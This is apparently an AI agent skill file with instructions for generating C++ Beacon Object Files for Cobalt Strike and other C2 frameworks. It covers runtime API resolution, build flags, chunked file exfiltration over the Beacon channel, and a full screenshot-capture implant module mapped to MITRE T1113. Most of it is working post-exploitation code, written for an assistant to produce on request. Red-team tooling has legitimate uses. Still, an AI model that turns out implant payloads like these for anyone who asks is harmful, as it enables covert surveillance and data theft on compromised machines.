---
name: cpp-bof
description: "Generate, compile, and debug Beacon Object Files (BOF) in C++ for Cobalt Strike and compatible C2 frameworks. Use when the user asks to create a C++ BOF, leverage RAII/templates/classes inside a BOF, use typedef+GetProcAddress DFR, integrate COM/GDI+, or needs dual-build (BOF+EXE) patterns."
license: MIT
compatibility: "Requires x86_64-w64-mingw32-g++ (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires Cobalt Strike or a compatible loader (e.g. COFFLoader, RunOF)."
metadata:
  author: AeonDave
  version: "2.0"
  category: bof
  language: cpp
---

# C++ Beacon Object Files (BOF) Development

This skill produces production-quality BOFs in C++. C++ offers advantages
for complex BOFs: RAII for handle management, templates, stronger type safety,
and COM/GDI+ integration. Patterns are derived from real-world C++ BOFs.

## When to use

- User says *"create a C++ BOF"* or *"write a BOF using classes"*
- Complex Win32/COM/GDI+ logic that benefits from C++ wrappers
- Need RAII patterns for automatic handle/resource cleanup inside BOFs
- Converting existing C++ code into a BOF
- Need dual-build support (`#ifdef BOF` / standalone EXE)

---

## Key differences from C BOFs

| Aspect | C BOF | C++ BOF |
|--------|-------|---------|
| Compiler | `x86_64-w64-mingw32-gcc` | `x86_64-w64-mingw32-g++` |
| Entry point | `void go(char*, int)` | `extern "C" void go(char*, int)` |
| Exceptions | N/A | **Must be disabled** (`-fno-exceptions`) |
| RTTI | N/A | **Must be disabled** (`-fno-rtti`) |
| STL | N/A | **Do not use** — no C++ runtime in BOFs |
| Constructors | N/A | Static/global constructors will **not** run |

> **Critical rule:** A C++ BOF must not depend on the C++ runtime (`libstdc++`).
> No `new`/`delete`, no STL containers, no exceptions, no RTTI.

---

## Step 1 — File header and structure

```cpp
/**
 * @file       mybof.cpp
 * @brief      One-line description.
 *
 * Technique:  Name of technique / tradecraft
 * MITRE ATT&CK: T1113 (Screen Capture) — example
 * Target:     x86_64 Windows 10/11, Server 2016+
 *
 * Build:
 *   ../scripts/build_bof.sh mybof.cpp
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}
```

---

## Step 2 — DFR strategies

### Strategy A: Standard DECLSPEC_IMPORT (recommended for < ~30 imports)

```cpp
/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
```

### Strategy B: typedef + GetProcAddress (for many imports or non-standard DLLs)

When you have many API calls (30+), DECLSPEC_IMPORT DFR can hit linker
limits. Use typedefs and resolve at runtime:

```cpp
/* ── Typedefs for runtime resolution ──────────────────── */
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

/* ── Global function pointers ─────────────────────────── */
static fnSelectObject   pSelectObject   = NULL;
static fnBitBlt         pBitBlt         = NULL;
static fnGetSystemMetrics pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pSelectObject     = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt           = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pGetSystemMetrics = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");

    return (pSelectObject && pBitBlt && pGetSystemMetrics);
}
```

Call `ResolveAPIs()` at the top of `go()` before using any resolved pointer.

> **When to use Strategy B:** GDI+, DirectX, COM interfaces, or any DLL not
> commonly linked (gdiplus.dll, d3d11.dll, wlanapi.dll).

---

## Step 3 — RAII wrappers

C++ shines in BOFs with RAII for automatic cleanup:

```cpp
class BofHandle {
    HANDLE h_;
public:
    explicit BofHandle(HANDLE h = NULL) : h_(h) {}
    ~BofHandle() {
        if (h_ && h_ != INVALID_HANDLE_VALUE)
            KERNEL32$CloseHandle(h_);
    }
    operator HANDLE() const { return h_; }
    HANDLE* operator&() { return &h_; }
    bool valid() const { return h_ && h_ != INVALID_HANDLE_VALUE; }
    BofHandle(const BofHandle&) = delete;
    BofHandle& operator=(const BofHandle&) = delete;
};
```

See `assets/bof_helpers.hpp` for additional wrappers (BofRegKey, BofFormat).

---

## Step 4 — Compilation

```bash
./scripts/build_bof.sh mybof.cpp
```

| Flag | Purpose |
|------|---------|
| `-m64 -c` | Target x64, compile only |
| `-fno-exceptions` | Disable C++ exceptions (no runtime) |
| `-fno-rtti` | Disable RTTI (no `typeid`, `dynamic_cast`) |
| `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` |
| `-fpack-struct=8` | Match Beacon struct packing |
| `-std=c++17` | Modern C++ features |

---

## Advanced patterns

### Dual-build: BOF + standalone EXE

Support both BOF and standalone compilation in the same source:

```cpp
#ifdef BOF
extern "C" {
#include "beacon.h"
}
#define PRINT(fmt, ...) BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__)
#else
#include <stdio.h>
#define PRINT(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#endif

void do_work(int pid) {
    PRINT("[+] Processing PID %d", pid);
    /* ... logic works in both modes ... */
}

#ifdef BOF
extern "C" void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    do_work(BeaconDataInt(&parser));
}
#else
int main(int argc, char** argv) {
    if (argc < 2) return 1;
    do_work(atoi(argv[1]));
    return 0;
}
#endif
```

Compile as BOF: `build_bof.sh mybof.cpp` (adds `-DBOF` automatically).
Compile as EXE: `x86_64-w64-mingw32-g++ -o mybof.exe mybof.cpp`.

### File download over Beacon channel

Use `CALLBACK_FILE*` constants for chunked file transfer:

```cpp
static void downloadFile(const char* fileName, const char* data, int dataLen) {
    /* Start download — send filename */
    int msgLen = (int)MSVCRT$strlen(fileName) + 1;  /* include null */
    char* start = (char*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), 0, 4 + msgLen);
    *(int*)start = msgLen;
    MSVCRT$memcpy(start + 4, fileName, msgLen);
    BeaconOutput(CALLBACK_FILE, start, 4 + msgLen);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, start);

    /* Send data in chunks */
    int offset = 0;
    while (offset < dataLen) {
        int chunk = dataLen - offset;
        if (chunk > 900 * 1024) chunk = 900 * 1024;  /* 900KB max */
        BeaconOutput(CALLBACK_FILE_WRITE, data + offset, chunk);
        offset += chunk;
    }

    /* Close download */
    BeaconOutput(CALLBACK_FILE_CLOSE, NULL, 0);
}
```

Also available: `CALLBACK_SCREENSHOT` for screenshot data.

### GDI+ / COM integration

Load non-standard DLLs dynamically and resolve flat API:

```cpp
/* GDI+ flat API typedefs */
typedef int (WINAPI *fnGdiplusStartup)(ULONG_PTR*, void*, void*);
typedef void (WINAPI *fnGdiplusShutdown)(ULONG_PTR);
typedef int (WINAPI *fnGdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int (WINAPI *fnGdipSaveImageToStream)(void*, CLSID*, void*);

static HMODULE hGdiPlus = NULL;
static fnGdiplusStartup        pGdiplusStartup        = NULL;
static fnGdiplusShutdown       pGdiplusShutdown       = NULL;
static fnGdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;

static BOOL ResolveGdiPlus(void) {
    hGdiPlus = KERNEL32$LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus) return FALSE;
    pGdiplusStartup = (fnGdiplusStartup)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusStartup");
    pGdiplusShutdown = (fnGdiplusShutdown)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusShutdown");
    pGdipCreateBitmapFromHBITMAP = (fnGdipCreateBitmapFromHBITMAP)
        KERNEL32$GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    return (pGdiplusStartup && pGdiplusShutdown);
}
```

> **Pitfall:** Do NOT use `using namespace Gdiplus;` in BOFs — it creates
> COMDAT section conflicts with the Beacon loader. Use the flat C API
> (`GdipCreateBitmapFromHBITMAP`, etc.) resolved via GetProcAddress.

### COM / IStream usage

```cpp
typedef HRESULT (WINAPI *fnCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM*);
static fnCreateStreamOnHGlobal pCreateStreamOnHGlobal = NULL;

/* Resolve from ole32.dll */
HMODULE hOle32 = KERNEL32$LoadLibraryA("ole32.dll");
pCreateStreamOnHGlobal = (fnCreateStreamOnHGlobal)
    KERNEL32$GetProcAddress(hOle32, "CreateStreamOnHGlobal");

IStream* pStream = NULL;
pCreateStreamOnHGlobal(NULL, TRUE, &pStream);
/* ... use pStream ... */
pStream->Release();
```

### What you CAN vs MUST NOT use

| Safe | Unsafe |
|------|--------|
| Classes / structs (stack) | `new` / `delete` |
| RAII (destructors) | STL containers |
| Templates, `constexpr` | `<iostream>`, `<fstream>` |
| `static_assert`, `enum class` | Exceptions (`throw`/`catch`) |
| Namespaces, `auto`, references | RTTI (`dynamic_cast`, `typeid`) |
| Lambda (no capture) | Global objects with constructors |

---

## Complete example — screenshot.cpp

```cpp
/**
 * @file       screenshot.cpp
 * @brief      Capture screen and send via Beacon channel.
 *
 * Technique:  GDI screen capture + GDI+ JPEG encoding
 * MITRE ATT&CK: T1113 (Screen Capture)
 * Target:     x86_64 Windows 10/11
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}

/* ── KERNEL32 (DECLSPEC_IMPORT — few calls) ───────────── */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ── GDI32 / USER32 (typedef — many calls) ────────────── */
typedef HDC     (WINAPI *fnGetDC)(HWND);
typedef int     (WINAPI *fnReleaseDC)(HWND, HDC);
typedef HDC     (WINAPI *fnCreateCompatibleDC)(HDC);
typedef HBITMAP (WINAPI *fnCreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL    (WINAPI *fnDeleteObject)(HGDIOBJ);
typedef BOOL    (WINAPI *fnDeleteDC)(HDC);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

static fnGetDC                  pGetDC = NULL;
static fnReleaseDC              pReleaseDC = NULL;
static fnCreateCompatibleDC     pCreateCompatibleDC = NULL;
static fnCreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static fnSelectObject           pSelectObject = NULL;
static fnBitBlt                 pBitBlt = NULL;
static fnDeleteObject           pDeleteObject = NULL;
static fnDeleteDC               pDeleteDC = NULL;
static fnGetSystemMetrics       pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pGetDC                  = (fnGetDC)KERNEL32$GetProcAddress(hUser32, "GetDC");
    pReleaseDC              = (fnReleaseDC)KERNEL32$GetProcAddress(hUser32, "ReleaseDC");
    pGetSystemMetrics       = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");
    pCreateCompatibleDC     = (fnCreateCompatibleDC)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (fnCreateCompatibleBitmap)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject           = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt                 = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pDeleteObject           = (fnDeleteObject)KERNEL32$GetProcAddress(hGdi32, "DeleteObject");
    pDeleteDC               = (fnDeleteDC)KERNEL32$GetProcAddress(hGdi32, "DeleteDC");

    return (pGetDC && pCreateCompatibleDC && pBitBlt);
}

extern "C" void go(char* args, int len) {
    (void)args; (void)len;

    if (!ResolveAPIs()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve GDI APIs");
        return;
    }

    int cx = pGetSystemMetrics(0 /* SM_CXSCREEN */);
    int cy = pGetSystemMetrics(1 /* SM_CYSCREEN */);

    HDC hdcScreen = pGetDC(NULL);
    HDC hdcMem    = pCreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = pCreateCompatibleBitmap(hdcScreen, cx, cy);
    HGDIOBJ hOld  = pSelectObject(hdcMem, hBmp);

    pBitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, 0x00CC0020 /* SRCCOPY */);

    /* TODO: encode hBmp to JPEG via GDI+ flat API, then:
     * BeaconOutput(CALLBACK_SCREENSHOT, jpegData, jpegLen);
     */

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured %dx%d screen", cx, cy);

    /* Cleanup */
    pSelectObject(hdcMem, hOld);
    pDeleteObject(hBmp);
    pDeleteDC(hdcMem);
    pReleaseDC(NULL, hdcScreen);
}
```

---

## Support files

| File | Description |
|------|-------------|
| `scripts/bof_template.cpp`         | Production C++ BOF skeleton with RAII + DFR |
| `scripts/build_bof.sh`             | Compiler wrapper with C++ flags |
| `references/REFERENCE.md`          | C++ BOF patterns, DFR reference, pitfalls |
| `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
| `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs |
| `assets/bof_helpers.hpp`           | RAII wrappers and utility templates for C++ BOFs |
